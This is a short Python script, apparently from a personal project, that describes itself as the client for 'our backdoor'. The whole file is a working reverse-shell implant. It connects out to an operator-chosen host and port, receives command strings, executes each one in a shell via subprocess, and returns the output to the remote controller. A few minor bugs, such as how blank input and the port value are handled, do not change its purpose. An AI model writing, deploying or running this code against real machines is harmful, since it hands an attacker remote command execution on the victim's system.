"""
Description: The client responsible for connecting to our backdoor.
Author: Aleksa Zatezalo
Date: September 2022
"""

# Imports
import socket
import subprocess

# Setting Up IP/Sockets
REMOTE_HOST = '127.0.0.1' 
REMOTE_PORT = 8081 # 2222
client = socket.socket()

# Ask for and set new IP & Port
new_host = input('Input Host IP (Blank if default).')
new_port = input('Input Host Port (Blank if default).')

if (new_host != "\n"):
    REMOTE_HOST = new_host
if (new_port != "\n"):
    REMOTE_PORT = new_port

# Initializing Connection
print("[-] Connection Initiating...")
client.connect((REMOTE_HOST, REMOTE_PORT))
print("[-] Connection initiated!")

# Runtime Loop
while True:
    print("[-] Awaiting commands...")
    command = client.recv(1024)
    command = command.decode()
    op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
    output = op.stdout.read()
    output_error = op.stderr.read()
    print("[-] Sending response...")
    client.send(output + output_error)